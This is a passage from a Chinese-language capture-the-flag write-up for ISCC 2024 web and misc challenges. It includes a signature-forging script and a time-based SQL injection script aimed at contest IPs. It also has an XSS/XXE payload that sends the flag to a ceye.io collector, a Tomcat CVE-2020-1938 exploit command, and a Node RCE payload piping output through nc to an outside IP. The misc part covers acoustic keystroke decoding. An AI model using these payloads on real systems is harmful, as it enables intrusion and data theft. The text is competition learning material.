class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;The file does not exist&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content.encode()).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secret_key + param.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>) + action.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>)).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run()<br></code></pre></td></tr></table></figure>

<p>对代码进行审计，分析代码功能：</p>
<p>&#x2F;geneSign 用于生成签名，参数为 action 和 param。</p>
<p>&#x2F;De1ta 接收 action, param 和 sign 参数，进行签名验证和 WAF 检查。当 action &#x3D; read 时读取文件，scan 时追加内容</p>
<p>waf 函数会阻止以 “gopher” 或 “file” 开头的参数。</p>
<p><img src="../../../../img/archives/2024ISCC05/58718fe7c35523bbed06e2da49b446ab.png" srcset="/img/loading.gif" lazyload> 读取 flag 需要 action 里既有 read 又有 scan，但是检查了 sign，而&#x2F;geneSign 加密时 action 只能为 scan，查看 get_sign 函数，发现存在漏洞，key，param，action 直接进行了拼接，可以在 param 中添加 read（flag.txtreadscan），则可以伪造 sign</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>r1=requests.get(<span class="hljs-string">&quot;http://101.200.138.180:12315/geneSign?param=flag.txtread&quot;</span>)<br>sign=r1.text<br><span class="hljs-comment"># print(sign)</span><br>r2 = requests.get(<span class="hljs-string">&quot;http://101.200.138.180:12315/De1ta?param=flag.txt&quot;</span>,cookies=&#123;<span class="hljs-string">&#x27;action&#x27;</span>:<span class="hljs-string">&#x27;readscan&#x27;</span>,<span class="hljs-string">&#x27;sign&#x27;</span>:sign&#125;)<br><span class="hljs-built_in">print</span>(r2.text)<br></code></pre></td></tr></table></figure>

<h4 id="Web-掉进阿帕奇的工资"><a href="#Web-掉进阿帕奇的工资" class="headerlink" title="Web 掉进阿帕奇的工资"></a>Web 掉进阿帕奇的工资</h4><p><img src="../../../../img/archives/2024ISCC05/9b9c0bcc4509ddd6cc45564f29e613a4.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/1f062ff4a3bc0870366e0e888158cf2d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/efe72a9da5079bc29167ee5cb3d49d84.png" srcset="/img/loading.gif" lazyload> 注册账号进行登录，提示 Technology Department seems to be an internal employee, but today is a blacklist candidate</p>
<p><img src="../../../../img/archives/2024ISCC05/561767491dc740047d81b84ad52d171c.png" srcset="/img/loading.gif" lazyload> 发现注册网站注释了 job 参数，抓包修改注册为 admin，仍然无法登录，尝试重置信息</p>
<p><img src="../../../../img/archives/2024ISCC05/5e70b5dc506203f40359992064ff7f75.png" srcset="/img/loading.gif" lazyload> wjMzoiI8TZ95wOCMUQaBjAFRFrPO4W</p>
<p><img src="../../../../img/archives/2024ISCC05/45233a7596c22c0df9e650ff97b89eca.png" srcset="/img/loading.gif" lazyload> 成功登录，根据题目提示查看工资页面</p>
<p><img src="../../../../img/archives/2024ISCC05/8dab495f60538e1c2714fca631e30f26.png" srcset="/img/loading.gif" lazyload> 尝试输入，发现存在执行，但不清楚逻辑</p>
<p><img src="../../../../img/archives/2024ISCC05/2f9c26f1d8aa82ce6ca3d324a2ac0aa4.png" srcset="/img/loading.gif" lazyload> 输入 ls 和 11 返回]B，ls 和 22 返回^A，判断出是 xor</p>
<p>输入^A 和 22，成功执行 ls，查看 docfile，发现套了一个 nginx，怀疑 flag 在 secret.host 中</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">secret.host:<br>image: nginx<br>container_name: secret.host<br>volumes:<br>- ./:/etc/nginx/conf.d/<br></code></pre></td></tr></table></figure>

<p>尝试 curl docker 读取都没成功，最后构造 php 语句执行成功</p>
<p>php -r “echo file_get_contents(‘<a target="_blank" rel="noopener" href="http://secret.host/flag">http://secret.host/flag</a>‘);” <img src="../../../../img/archives/2024ISCC05/8cf61e74fcf2e234ca34f61cde567b5a.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/f2d718084494200ab25589aed471558b.png" srcset="/img/loading.gif" lazyload> <a target="_blank" rel="noopener" href="https://cyberchef.org/#recipe=XOR(%7B'option':'Latin1','string':'111AcAaa1119a11511212319772812aa0122hcdA12345A1911aV522AAAA'%7D,'Input%20differential',true">https://cyberchef.org/#recipe &#x3D; XOR(%7B’option’:’Latin1’,’string’:’111AcAaa1119a11511212319772812aa0122hcdA12345A1911aV522AAAA’%7D,’Input%20differential’, true)&amp;input &#x3D; cGhwIC1yICJlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vc2VjcmV0Lmhvc3QvZmxhZycpOyI</a>&amp;input &#x3D; cGhwIC1yICJlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vc2VjcmV0Lmhvc3QvZmxhZycpOyI)</p>
<h4 id="Web-一道普通的-XSS-题目"><a href="#Web-一道普通的-XSS-题目" class="headerlink" title="Web 一道普通的 XSS 题目"></a>Web 一道普通的 XSS 题目</h4><p><img src="../../../../img/archives/2024ISCC05/797a492965aa8942234641da53c58c33.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/72c37833e740d15a3bed7845ee1a392d.png" srcset="/img/loading.gif" lazyload> 打开网页显示这里没有提示，查看 hint 得到提示</p>
<p><img src="../../../../img/archives/2024ISCC05/175a81283c0d8c94e25a2de0aa1f7105.png" srcset="/img/loading.gif" lazyload> 页面上的祝好运可以点击，可以得到&#x2F;flag 页面源码</p>
<p><img src="../../../../img/archives/2024ISCC05/5788742abd4099a66dd7bff2f4a6ab22.png" srcset="/img/loading.gif" lazyload> 访问提示的 adminbot，缺少参数</p>
<p>测试发现首页的 payload 参数可以执行，编写 payload，xss <img src="../../../../img/archives/2024ISCC05/b69e9e7d0a56562470978c5a4d8c8484.png" srcset="/img/loading.gif" lazyload> 外带到 http:&#x2F;&#x2F;******.ceye.io&#x2F;，得到 flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">payload=&lt;%3Fxml%20version%3D&quot;1.0&quot;%3F&gt;%0A&lt;%3Fxml-stylesheet%20type%3D&quot;text%2Fxsl&quot;%20href%3D&quot;data%3Atext%2Fplain%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIj8%2BCjwhRE9DVFlQRSBhIFsKPCFFTlRJVFkgeHhlIFNZU1RFTSAiaHR0cDovLzEwMS4yMDAuMTM4LjE4MDozMDI4MC9mbGFnIiA%2BXT4KPHhzbDpzdHlsZXNoZWV0IHhtbG5zOnhzbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS9YU0wvVHJhbnNmb3JtIgp2ZXJzaW9uPSIxLjAiPgo8eHNsOnRlbXBsYXRlIG1hdGNoPSIvYXNkZiI%2BCjxIVE1MPgo8SEVBRD4KPFRJVExFPjwvVElUTEU%2BCjwvSEVBRD4KPEJPRFk%2BCjxpbWc%2BCjx4c2w6YXR0cmlidXRlIG5hbWU9InNyYyI%2BCmh0dHA6Ly9jYWgwOHguY2V5ZS5pby8%2FJnh4ZTsKPC94c2w6YXR0cmlidXRlPgo8L2ltZz4KPC9CT0RZPgo8L0hUTUw%2BCjwveHNsOnRlbXBsYXRlPgo8L3hzbDpzdHlsZXNoZWV0Pg%3D%3D&quot;%3F&gt;%0A&lt;asdf&gt;&lt;%2Fasdf&gt;<br></code></pre></td></tr></table></figure>

<h4 id="Web-与时俱进"><a href="#Web-与时俱进" class="headerlink" title="Web 与时俱进"></a>Web 与时俱进</h4><p><img src="../../../../img/archives/2024ISCC05/d21db22277e188c976d5df24f8fb87c1.png" srcset="/img/loading.gif" lazyload> 题目提示 CVE-2022-28346、CVE-2023-50782</p>
<p>查看网页源代码，发现 nick_name 字段，提示 aggregate。</p>
<p><img src="../../../../img/archives/2024ISCC05/cbdc6974eeb5878195c1f99ff1dff6c8.png" srcset="/img/loading.gif" lazyload> 进行 django 时间盲注。</p>
<p><img src="../../../../img/archives/2024ISCC05/931dd4ca43de9773ba16f8cb1de34262.png" srcset="/img/loading.gif" lazyload> 得到一个 url，访问后发现下载了网页源码</p>
<p>源码中包含 p <img src="../../../../img/archives/2024ISCC05/5d50e01bcdbbd69c484708689e04a0e9.png" srcset="/img/loading.gif" lazyload> ython 库依赖，公钥，日志，密文，发现依赖 cryptography &#x3D;&#x3D; 3.3.0</p>
<p>审计之后发现 finally&#x2F;views.py 和 finally&#x2F;functions.py 中是加密解密逻辑，但是没有私钥，继续在服务器上寻找，结合另一个提示 CVE-2023-50782，在网上寻找到 exp，对其进行利用得到 flag</p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/kazkansouh/e4d710c6a6928187323fa164bdd70401">Classic Bleichenbacher RSA Padding Oracle Attack (github.com)</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLInjector</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.url = <span class="hljs-string">&quot;http://123.57.204.215:8003/inquiry/&quot;</span><br>        <span class="hljs-variable language_">self</span>.headers = &#123;&#125;<br>        <span class="hljs-variable language_">self</span>.cookies = &#123;<span class="hljs-string">&quot;csrftoken&quot;</span>: <span class="hljs-string">&quot;8pPnNzLx77uLm4bkZaM7rDnP2MyoFxoSFvOXGWtzpGaknkM1Dgp9wDIB44fQ644o&quot;</span>&#125;<br>        <span class="hljs-variable language_">self</span>.data = &#123;<br>            <span class="hljs-string">&quot;csrfmiddlewaretoken&quot;</span>: <span class="hljs-string">&quot;Hg5nkrubq2xkDkiNBYjM58FmIA3wHK1zem4XdOcdIBdTEATuf4WOa808KSKY8hH5&quot;</span>,<br>            <span class="hljs-string">&quot;sel_value&quot;</span>: <span class="hljs-string">&quot;name&quot;</span><br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inject_time</span>(<span class="hljs-params">self, condition</span>):<br>        <span class="hljs-variable language_">self</span>.data[<span class="hljs-string">&quot;nick_name&quot;</span>] = <span class="hljs-string">f&#x27;name&quot;,(case when(<span class="hljs-subst">&#123;condition&#125;</span>) then randomblob(1000000000) else 0 end),&quot;1&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                start_time = time.time()<br>                response = requests.post(<span class="hljs-variable language_">self</span>.url, headers=<span class="hljs-variable language_">self</span>.headers, cookies=<span class="hljs-variable language_">self</span>.cookies, data=<span class="hljs-variable language_">self</span>.data)<br>                end_time = time.time()<br>                <span class="hljs-comment"># print(end_time - start_time)</span><br>                <span class="hljs-keyword">return</span> end_time - start_time &gt; <span class="hljs-number">3</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_length</span>(<span class="hljs-params">self, query</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.inject_time(<span class="hljs-string">f&quot;length(<span class="hljs-subst">&#123;query&#125;</span>)=<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>):<br>                <span class="hljs-keyword">return</span> i<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_char</span>(<span class="hljs-params">self, query, index</span>):<br>        alphabet = string.printable<br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> alphabet:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.inject_time(<span class="hljs-string">f&quot;substr(<span class="hljs-subst">&#123;query&#125;</span>,<span class="hljs-subst">&#123;index&#125;</span>,1)=&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;&quot;</span>):<br>                <span class="hljs-keyword">return</span> char<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_value</span>(<span class="hljs-params">self, query, length</span>):<br>        result = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length + <span class="hljs-number">1</span>):<br>            char = <span class="hljs-variable language_">self</span>.get_char(query, i)<br>            result += <span class="hljs-string">f&quot;&#123;&#123;<span class="hljs-subst">&#123;i&#125;</span>&#125;&#125;&quot;</span> <span class="hljs-keyword">if</span> char <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> char<br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">self</span>):<br>        flag_query = <span class="hljs-string">&quot;(select group_concat(flag) from flag)&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-variable language_">self</span>.get_char(flag_query, i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">14</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    injector = SQLInjector()<br>    <span class="hljs-built_in">print</span>(injector.get_flag())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<h4 id="Web-原神启动"><a href="#Web-原神启动" class="headerlink" title="Web 原神启动"></a>Web 原神启动</h4><p><img src="../../../../img/archives/2024ISCC05/bb85cd2206114e79b1bb63d232e9120d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/187f365df9bedcb0421b437b77757f8b.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/e11dca655a08bc18f7f0da630403a763.png" srcset="/img/loading.gif" lazyload> 打开网页，f12 查看代码，发现熊曰解密和两个 html</p>
<p><img src="../../../../img/archives/2024ISCC05/2fe088b337b7a9b2cfbc9c8d4e33d05e.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/e42689ec215d4a35ff75476ecd3b2ac8.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/e2da52ef9dd5235008696babacf77f6e.png" srcset="/img/loading.gif" lazyload> 根据提示访问 flag.txt，但是获得的 flag 是假的。</p>
<p>但是网页提示 flag 在 flag.txt 中，寻找读取任意文件的方式。探测发现网站版本为 Apache Tomcat&#x2F;8.5.32，搜索该版本漏洞发现文件包含漏洞（CVE-2020-1938），可实现任意文件读取</p>
<p><img src="../../../../img/archives/2024ISCC05/36053aca6994075e8f9de72a8809390f.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/e613c17c39d519b7a71f4a6484ede7a9.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/d38141b84aaad4bb42e4d9e3c58773b6.png" srcset="/img/loading.gif" lazyload> 在 github 上下载 exp 进行攻击</p>
<p><img src="../../../../img/archives/2024ISCC05/d093be4453a4c0f5f22214f08487d38d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/970f703220213b40d0f82071e59ceb85.png" srcset="/img/loading.gif" lazyload> 执行语句：python CVE-2020-1938.py -p 8009 -f &#x2F;WEB-INF&#x2F;flag.txt 101.200.138.180</p>
<p>得到 flag ISCC{sNLhhYAAjABihv5B}</p>
<h4 id="Web-这题我出不了了"><a href="#Web-这题我出不了了" class="headerlink" title="Web 这题我出不了了"></a>Web 这题我出不了了</h4><p><img src="../../../../img/archives/2024ISCC05/719246d9d0384a3acf62772faf9c222c.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/a501e9e98add7e2fe8b6dd238c008f34.png" srcset="/img/loading.gif" lazyload> 访问网站，过一会再看看的下面一开始显示了一个::: fff 的 ip，刷新后消失了，暂时不管进下一个页面</p>
<p><img src="../../../../img/archives/2024ISCC05/724a855ff31e664246d68d791788be15.png" srcset="/img/loading.gif" lazyload> 发现本题连接了两个数据库 一个是 mysql，应该是 waf，另外一个是 postgresql7.0.2 存用户数据 解密 debug 后的 base64 得到提示 fs.readFile(‘printFlag’, ‘utf8’, (err, data) &#x3D;&gt; {console.log(data);});</p>
<p>Psql7.0 时存在 rce，可以进行命令执行</p>
<p>可以使用 psql 将 hex 转 Unicode，通过自定义转译符替换关键字, 从而绕过 waf，然后构造 rce，单双引号不能使用，可以用反引号，构造 exp 进行攻击得到 flag</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/701e6342cd71">[hitcon2017] Sql-so-hard 复现 - 简书 (jianshu.com)</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 61.139.65.135 58119`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (<span class="hljs-string">&#x27; &#x27;</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">1024</span>*<span class="hljs-number">16</span>)<br>username = <span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))+<span class="hljs-built_in">str</span>(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>data = &#123;<br>    <span class="hljs-string">&#x27;username&#x27;</span>: username+payload,<br>    <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;AAAAAA&#x27;</span><br>&#125;<br>r =requests.post(<span class="hljs-string">&#x27;http://101.200.138.180:32031/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Misc-FunZip"><a href="#Misc-FunZip" class="headerlink" title="Misc FunZip "></a>Misc FunZip <img src="../../../../img/archives/2024ISCC05/b6c34d42cad75cf15e48eab8bcccf2d9.png" srcset="/img/loading.gif" lazyload></h4><p>工具一把梭</p>
<h4 id="Misc-有人让我给你带个话"><a href="#Misc-有人让我给你带个话" class="headerlink" title="Misc 有人让我给你带个话"></a>Misc 有人让我给你带个话</h4><p><img src="../../../../img/archives/2024ISCC05/6322914718876e68b14d976baa1e792a.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/a8f171f1945052c1f94587eab2bc860f.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/eeb00166d26a8261dfbb2cc04d2fe360.png" srcset="/img/loading.gif" lazyload> 使用 010 分析 tony.png，在其中搜索 89504e47 发现另一张图片</p>
<p>分离提取出 lyra.png</p>
<p><img src="../../../../img/archives/2024ISCC05/2518316d47f718b83cef501a98aa6568.png" srcset="/img/loading.gif" lazyload> 发现是音频编码压缩</p>
<p><img src="../../../../img/archives/2024ISCC05/9928c4f4c8da3310be97fd574ff5aba3.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/910179640399a040de377d79f31c39e0.png" srcset="/img/loading.gif" lazyload> 使用此工具进行解密，得到一段语言，其中是社会主义价值观编码的内容，使用在线网站识别语音，识别后进行解码得到 flag</p>
<p><img src="../../../../img/archives/2024ISCC05/9194d67f18432a4994bf1b4afbd8116a.png" srcset="/img/loading.gif" lazyload> 得到 flag ISCC{2QKK#e6BCMJ}</p>
<h4 id="Misc-Magic-Keyboard"><a href="#Misc-Magic-Keyboard" class="headerlink" title="Misc Magic_Keyboard"></a>Misc Magic_Keyboard</h4><p>网上搜索发现 PBCTF 2021 PlaidCTF2012 出过类似题目</p>
<p><a target="_blank" rel="noopener" href="https://github.com/NgocPhuc4/CTFs-writeups/blob/master/PBCTF2021/Misc/GhostWriter.md">CTFs—writeups&#x2F;PBCTF2021&#x2F;Misc&#x2F;www.example.com at master·NgocPhuc4/CTFs—writeups --- CTFs-writeups/PBCTF2021/Misc/GhostWriter.md at master · NgocPhuc4/CTFs-writeups (github.com)</a></p>
<p><img src="../../../../img/archives/2024ISCC05/deb6d9292752b1d98991014fa824b8d3.png" srcset="/img/loading.gif" lazyload> <a target="_blank" rel="noopener" href="https://ctftime.org/task/17576">https://ctftime.org/task/17576</a></p>
<p>安装 acoustic-keylogging 存储库的 docker，并安装 libsndfile1-dev</p>
<p><img src="../../../../img/archives/2024ISCC05/3e8dd87573bb8e53d7e52e8f3edceb09.png" srcset="/img/loading.gif" lazyload> 根据找到的脚本进行解密，发现接不出东西，查看源码发现是 threshold 的值设置过小，修改值为 3000-5000，重新解密，得到一串字符串（exp1）</p>
<p>因为只有十几种字符，猜测为 hex 替换映射，又因为开头必然是 ISCC{，结尾是}，所以可以根据这个得到映射表</p>
<p>a-4 b-9 c-5 d-3 e-7 f-b l-d</p>
<p><img src="../../../../img/archives/2024ISCC05/9eea286b8c61457b5a727c2c94034a34.png" srcset="/img/loading.gif" lazyload> 然后根据上面的表再猜常用字符（exp2）, 统计出现次数</p>
<p><img src="../../../../img/archives/2024ISCC05/d8792f78efed66513a2ce13e9b0dd5d6.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/b0434ca059ca1fbde50429db61e0fd04.png" srcset="/img/loading.gif" lazyload> gc 出现 5 次，因为 c 是 5，则可以判段 g，而 3457 都存在，则 g 必为 6，ch gi 无法判断</p>
<p>a-4 b-9 c-5 d-3 e-7 f-b g-6 l-d</p>
<p><img src="../../../../img/archives/2024ISCC05/267338d6895eff990425d3ab3fa2c4cb.png" srcset="/img/loading.gif" lazyload> 拿我们得到的表去进行爆破得到 flag（exp3）</p>
<p>得到 ISCC{you_can_be_argumentative_people}</p>
<p>Exp1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> acoustic_keylogger.audio_processing <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> acoustic_keylogger.unsupervised <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> MinMaxScaler<br><br>data = wav_read(<span class="hljs-string">&quot;attachment-45.wav&quot;</span>)<br><br>keystrokes = detect_keystrokes(data)<br><br>X = [extract_features(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> keystrokes]<br>X_norm = MinMaxScaler().fit_transform(X)<br><br><span class="hljs-comment"># len(set([x[0] for x in X_norm]))</span><br><br>letters = &#123;&#125;<br>phrase = []<br>current_letter = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> X_norm:<br>    <span class="hljs-keyword">if</span> x[<span class="hljs-number">0</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> letters:<br>        letters[x[<span class="hljs-number">0</span>]] = current_letter<br>        current_letter += <span class="hljs-number">1</span><br>    phrase.append(letters[x[<span class="hljs-number">0</span>]])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> phrase]))<br></code></pre></td></tr></table></figure>

<p>exp2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>s=<span class="hljs-string">&#x27;abcdadadefebghecchgdgigjchgkgcchgiekgeecglgcgjeagieagbeggcchemgcghemgngcel&#x27;</span><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(s)/<span class="hljs-number">2</span>)):<br>    l.append(s[i*<span class="hljs-number">2</span>:i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span>(pd.Series(l).value_counts())<br></code></pre></td></tr></table></figure>

<p>exp3</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br>ciphertext = <span class="hljs-string">&quot;abcdadadefebghecchgdgigjchgkgcchgiekgeecglgcgjeagieagbeggcchemgcghemgngcel&quot;</span><br>key_chars = <span class="hljs-string">&#x27;a1e2c08f&#x27;</span><br>valid_chars = <span class="hljs-built_in">set</span>(<span 